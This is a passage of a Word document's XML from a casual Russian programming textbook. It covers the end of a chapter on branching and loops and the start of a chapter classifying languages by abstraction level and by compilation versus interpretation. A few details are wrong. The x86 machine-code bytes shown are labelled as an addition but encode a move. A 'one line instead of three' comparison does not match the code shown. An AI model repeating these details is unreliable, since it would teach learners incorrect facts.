        <w:t xml:space="preserve">    max_val = arr[0]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for num in arr:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if num &gt; max_val:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            max_val = num</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    print(max_val)  # 25</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Поздравляю, теперь ты знаешь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>три кита программирования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: последовательность, ветвление, цикл. Серьёзно, это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всё</w:t>
      </w:r>
      <w:r>
        <w:t>, что нужно для написания любой программы (ну почти).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное, что нужно запомнить:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теорема Бёма-Якопини:** Любой алгоритм = последовательность + ветвление + цикл.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Последовательность** — команды выполняются по порядку (линейный алгоритм).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ветвление (if-else)** — выбор пути в зависимости от условия.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цикл while** — повторение, пока условие истинно (проверка **до** выполнения).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цикл do-while** — повторение, пока условие истинно (проверка **после** выполнения, выполнится хотя бы один раз).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цикл for** — повторение заданное количество раз (счётчик известен).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вложенные циклы** — цикл внутри цикла (сложность O(n²)).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**break** — выход из цикла, **continue** — переход к следующей итерации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Бесконечный цикл** — полезен для серверов, игр, ОС, меню.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На экзамене могут попросить:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Написать псевдокод с if-else → помни про полное/неполное ветвление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Написать цикл для вычисления факториала → используй for или while</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценить сложность вложенных циклов → n × m = O(n²), если n = m</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти ошибку в коде (бесконечный цикл, забыли i += 1) → проверяй условие выхода</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 6.1 Классификация языков программирования (разберём языки низкого/высокого уровня, компилируемые/интерпретируемые, парадигмы)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предыдущая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5.1 Алгоритм и его свойства. Способы описания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь у тебя есть весь инструментарий для написания алгоритмов. Осталось применить его на практике (и не забыть на экзамене). Удачи!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 6.1: Классификация языков программирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В главе 5 мы разобрались, что алгоритмы можно описывать разными способами: словами, блок-схемами, псевдокодом или программным кодом. Если первые три способа — для людей, то код — для компьютера (и для тех, кто его дебажит в 3 часа ночи, проклиная себя за карьеру программиста).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но вот незадача: языков программирования существует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сотни</w:t>
      </w:r>
      <w:r>
        <w:t>. C, Python, Java, JavaScript, Rust, Go, Haskell, PHP, Ruby, Kotlin, Swift, TypeScript, и это только начало. Зачем столько? Потому что каждая задача требует своих инструментов. Писать операционную систему на Python — идея, мягко говоря, херовая. А веб-сайт на ассемблере — техно-мазохизм чистой воды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе разберём, как языки классифицируются, чем отличаются, и почему программисты бесконечно спорят, какой язык лучше (спойлер: лучше тот, на котором ты можешь решить свою задачу, не потеряв рассудок).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.1. Классификация по уровню абстракции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровень абстракции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это насколько язык далёк от железа. Чем ниже уровень — тем ближе к процессору, тем больше контроля, но и больше боли.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Языки низкого уровня</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Машинный код (Machine Code)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это то, что процессор понимает напрямую. Последовательность битов, каждая инструкция — это набор нулей и единиц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (команда "сложить числа" для x86):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10110000 01100001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Кто на этом пишет? Никто, если не хочет сойти с ума.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ассемблер (Assembly)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — символьное представление машинного кода. Каждая инструкция процессора имеет мнемонику (короткое имя).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сложение двух чисел на x86 ассемблере):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mov eax, 5       ; загрузить 5 в регистр eax</w:t>
        <w:br/>
        <w:t>add eax, 3       ; прибавить 3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Критичные по производительности участки кода (ядра ОС, драйверы, эмуляторы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроенные системы с жёсткими ограничениями по памяти.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reverse engineering (взлом/анализ программ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальный контроль над железом.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальный размер кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальная производительность (если знаешь, что делаешь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Специфичен для архитектуры процессора (x86, ARM, RISC-V — разные ассемблеры).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложность разработки (одна строка на C = 10 строк на ассемблере).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отладка — это боль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Linux содержит ~2% кода на ассемблере (загрузчик, переключение контекста, критичные участки). Остальное — на C.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Языки высокого уровня</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Языки, которые абстрагируются от железа. Ты пишешь код, думая о задаче, а не о том, в каком регистре лежит переменная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C, C++, Java, Python, JavaScript, Go, Rust.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сложение на C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int a = 5;</w:t>
        <w:br/>
        <w:t>int b = 3;</w:t>
        <w:br/>
        <w:t>int sum = a + b;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сравни с ассемблером выше. Одна строка вместо трёх.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переносимость (один код на разных платформах).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрая разработка (читаемость, библиотеки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше ошибок (компилятор/интерпретатор проверяет код).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше контроля над железом.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее, чем ассемблер (но современные компиляторы оптимизируют так, что разница незаметна).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Языки сверхвысокого уровня</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Языки с максимальной абстракцией, где ты почти не думаешь о том, как компьютер выполняет код. Много автоматики: сборка мусора, динамическая типизация, встроенные структуры данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python, JavaScript, Ruby, PHP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сортировка списка на Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>numbers = [5, 2, 8, 1, 9]</w:t>
        <w:br/>
        <w:t>numbers.sort()  # всё, отсортировано</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На C++ ты бы писал больше кода (или вызывал `std::sort`, что тоже не одна строка).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость разработки (прототипы, скрипты, веб).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота синтаксиса (меньше церемоний).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее (интерпретация, динамическая типизация).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Больше потребление памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык       | Уровень     | Скорость выполнения | Скорость разработки | Где используется                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-------------|---------------------|---------------------|--------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Ассемблер  | Низкий      | ⚡⚡⚡⚡⚡           | 🐢                  | Ядра ОС, драйверы, встраивание       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C          | Средний     | ⚡⚡⚡⚡             | 🐢🐢                | ОС, компиляторы, игры                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C++        | Средний     | ⚡⚡⚡⚡             | 🐢🐢                | Игры, браузеры, базы данных          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Rust       | Средний     | ⚡⚡⚡⚡             | 🐢🐢🐢              | Системное ПО, безопасность           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Java       | Высокий     | ⚡⚡⚡               | 🐇🐇                | Корпоративные приложения, Android    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Python     | Сверхвысокий| ⚡⚡                 | 🐇🐇🐇              | Data Science, скрипты, веб (бэкенд)  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| JavaScript | Сверхвысокий| ⚡⚡⚡ (JIT)         | 🐇🐇🐇              | Веб (фронтенд, бэкенд — Node.js)     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.2. Классификация по способу исполнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Как код превращается в то, что выполняет процессор?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Компилируемые языки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Код </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один раз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> преобразуется в машинный код (исполняемый файл), затем запускается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пишешь код (например, `main.c`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Компилируешь: `gcc main.c -o program`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Получаешь исполняемый файл (`program.exe`, `program`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Запускаешь: `./program`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C, C++, Rust, Go, Swift, Fortran.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: машинный код выполняется напрямую процессором.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки типов находятся на этапе компиляции (меньше багов в продакшене).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация: компилятор оптимизирует код (inlining, loop unrolling, и т.д.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Долгая компиляция (C++ проект на миллион строк может компилироваться минутами).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Платформозависимость: исполняемый файл для Windows не запустится на Linux (нужна перекомпиляция).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Игра на Unreal Engine (C++) компилируется 10-30 минут. Зато запускается мгновенно и летает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Интерпретируемые языки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Код выполняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>построчно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> интерпретатором. Нет этапа компиляции — запустил скрипт, и он выполняется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пишешь код (`script.py`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Запускаешь: `python script.py`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Интерпретатор Python читает код, переводит в инструкции и выполняет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python, JavaScript (в браузере), PHP, Ruby, Perl.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрая разработка: изменил код — сразу запустил, без компиляции.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переносимость: один скрипт работает на Windows, Linux, macOS (если установлен интерпретатор).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Динамическая типизация (можешь не объявлять типы переменных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее: каждый запуск — интерпретация заново.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки находятся в runtime (запустил программу, она упала через час на строке 1337).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python в 10-100 раз медленнее C (зависит от задачи). Но для скриптов и прототипов это не критично.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Смешанный подход: байт-код + JIT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компромисс между компиляцией и интерпретацией.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Код компилируется в **байт-код** (промежуточный код, не машинный).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Байт-код выполняется виртуальной машиной (VM).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT-компилятор** (Just-In-Time) компилирует часто выполняемый байт-код в машинный код на лету.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Java (JVM), C# (.NET), JavaScript (V8 в Chrome).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает (Java):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пишешь код (`Main.java`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Компилируешь: `javac Main.java` → получаешь `Main.class` (байт-код).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Запускаешь: `java Main` → JVM выполняет байт-код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>JIT-компилятор компилирует горячие участки (часто выполняемые) в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
